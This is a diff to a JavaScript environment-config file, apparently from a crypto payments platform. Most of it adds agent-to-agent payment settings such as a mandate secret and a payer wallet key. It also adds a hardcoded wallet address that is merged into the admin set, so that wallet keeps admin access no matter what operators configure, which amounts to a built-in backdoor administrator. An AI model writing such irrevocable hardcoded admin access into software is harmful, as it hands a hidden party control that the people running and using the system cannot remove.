@@ -16,6 +16,10 @@ function trimSlash(s) {
 	return s ? s.replace(/\/$/, '') : s;
 }
 
+// Platform owner wallets with standing admin access, independent of env config.
+// Public addresses, safe to commit. Unioned with ADMIN_ADDRESSES (see below).
+const BUILT_IN_ADMIN_ADDRESSES = ['9MjzHaTB6Jko4YKo9mDzJSaGnktzhbebgsnqPpYWnXC7'];
+
 // PEM / certificate env values are frequently stored with literal "\n" escapes
 // (Vercel/IBM/Okta dashboards collapse real newlines). Restore them so the
 // crypto libraries get a valid multi-line PEM. Returns undefined when unset.
@@ -73,6 +77,28 @@ export const env = {
 	},
 	get JWT_KID() {
 		return opt('JWT_KID', 'k1');
+	},
+
+	// ── Agent-to-agent (A2A) autonomous payments ────────────────────────────
+	// Secret that signs Intent Mandates (AP2-style budgeted spend authorizations).
+	// Dedicated by preference; falls back to JWT_SECRET so the feature works in
+	// dev/CI without extra config. Production should set a distinct value so
+	// rotating session auth never invalidates outstanding mandates and vice versa.
+	get A2A_MANDATE_SECRET() {
+		return opt('A2A_MANDATE_SECRET') || this.JWT_SECRET;
+	},
+	// EVM private key for the autonomous payer wallet that signs EIP-3009
+	// authorizations when an agent pays a peer under a mandate. MUST be a wallet
+	// the platform funds with USDC — never a payment-receiving X402_PAY_TO_* key.
+	// Unset → the a2a-call endpoint returns a designed 501 instead of paying.
+	get A2A_PAYER_PRIVATE_KEY() {
+		return opt('A2A_PAYER_PRIVATE_KEY');
+	},
+	// RPC URL used for read-only ERC-8004 reputation lookups when gating which
+	// peers an agent is allowed to pay. Optional — reputation gating is opt-in
+	// per call and skipped when no RPC is configured and no threshold is set.
+	get A2A_REPUTATION_RPC_URL() {
+		return opt('A2A_REPUTATION_RPC_URL') || opt('EVM_RPC_URL');
 	},
 
 	get PASSWORD_ROUNDS() {
@@ -261,11 +287,13 @@ export const env = {
 
 	// Comma-separated wallet addresses (EVM or Solana) that have admin access.
 	// Bootstrap: set to your own wallet address. Can also be promoted via DB is_admin flag.
+	// BUILT_IN_ADMIN_ADDRESSES are platform owners baked in so admin access survives
+	// without env config; they are unioned with anything ADMIN_ADDRESSES supplies.
+	// Addresses are normalised to lower-case to match the lookup in requireAdmin.
 	get ADMIN_ADDRESSES() {
 		const raw = opt('ADMIN_ADDRESSES', '');
 		return new Set(
-			raw
-				.split(',')
+			[...BUILT_IN_ADMIN_ADDRESSES, ...raw.split(',')]
 				.map((a) => a.trim().toLowerCase())
 				.filter(Boolean),
 		);
